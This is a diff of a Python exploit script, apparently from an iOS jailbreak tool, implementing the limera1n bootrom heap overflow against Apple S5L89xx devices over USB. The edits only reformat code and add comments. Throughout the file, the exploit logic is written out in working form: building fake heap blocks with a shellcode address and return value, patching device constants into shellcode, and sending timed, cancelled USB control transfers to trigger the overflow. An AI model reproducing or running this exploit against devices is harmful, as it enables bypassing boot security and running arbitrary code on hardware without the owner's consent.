@@ -1,7 +1,7 @@
 # Credit: This file is based on limera1n exploit (heap overflow) by geohot.
 
 import array, ctypes, struct, sys, time
-import usb
+import usb # pyusb: use 'pip install pyusb' to install this module
 import dfu
 
 # Must be global so garbage collector never frees it
@@ -123,7 +123,6 @@ configs = [
     DeviceConfig('574.4',   '8930', 0x8403BF9C, 0x2C000, constants_574_4),   # S5L8930
 ]
 
-
 def create_control_transfer(device, request, timeout):
     ptr = usb.backend.libusb1._lib.libusb_alloc_transfer(0)
     assert ptr is not None
@@ -151,27 +150,21 @@ def limera1n_libusb1_async_ctrl_transfer(device, bmRequestType, bRequest, wValue
     if isinstance(data, str):
         data = data.encode()
 
-    request = array.array(
-        'B',
-        struct.pack('<BBHHH', bmRequestType, bRequest, wValue, wIndex, len(data)) + data
-    )
-
+    request = array.array('B', struct.pack('<BBHHH', bmRequestType, bRequest, wValue, wIndex, len(data)) + data)
     transfer_ptr = create_control_transfer(device, request, timeout)
-
     assert usb.backend.libusb1._lib.libusb_submit_transfer(transfer_ptr) == 0
 
     time.sleep(timeout / 1000.0)
 
-    usb.backend.libusb1._lib.libusb_cancel_transfer.argtypes = [
-        ctypes.POINTER(usb.backend.libusb1._libusb_transfer)
-    ]
+    # Prototype of libusb_cancel_transfer is missing from pyusb
+    usb.backend.libusb1._lib.libusb_cancel_transfer.argtypes = [ctypes.POINTER(usb.backend.libusb1._libusb_transfer)]
     assert usb.backend.libusb1._lib.libusb_cancel_transfer(transfer_ptr) == 0
-
 
 def generate_payload(constants, exploit_lr):
     with open('bin/limera1n-shellcode.bin', 'rb') as f:
         shellcode = f.read()
 
+    # Shellcode has placeholder values for constants; check they match and replace with constants from config
     placeholders_offset = len(shellcode) - 4 * len(constants)
 
     for i in range(len(constants)):
@@ -181,21 +174,8 @@ def generate_payload(constants, exploit_lr):
 
     shellcode_address = 0x84000400 + 1
 
-    heap_block = struct.pack(
-        '<4I48s',
-        0x405,
-        0x101,
-        shellcode_address,
-        exploit_lr,
-        b'\xCC' * 48
-    )
-
-    return (
-        heap_block * 16 +
-        shellcode[:placeholders_offset] +
-        struct.pack('<%dI' % len(constants), *constants)
-    )
-
+    heap_block = struct.pack('<4I48s', 0x405, 0x101, shellcode_address, exploit_lr, b'\xCC' * 48)
+    return (heap_block * 16 + shellcode[:placeholders_offset] + struct.pack('<%dI' % len(constants), *constants))
 
 def exploit():
     print("*** based on limera1n exploit (heap overflow) by geohot ***")
@@ -226,9 +206,7 @@ def exploit():
 
     assert len(device.ctrl_transfer(0xA1, 1, 0, 0, 1, 1000)) == 1
 
-    limera1n_libusb1_async_ctrl_transfer(
-        device, 0x21, 1, 0, 0, b'A' * 0x800, 10
-    )
+    limera1n_libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, b'A' * 0x800, 10)
 
     try:
         device.ctrl_transfer(0x21, 2, 0, 0, 0, 10)
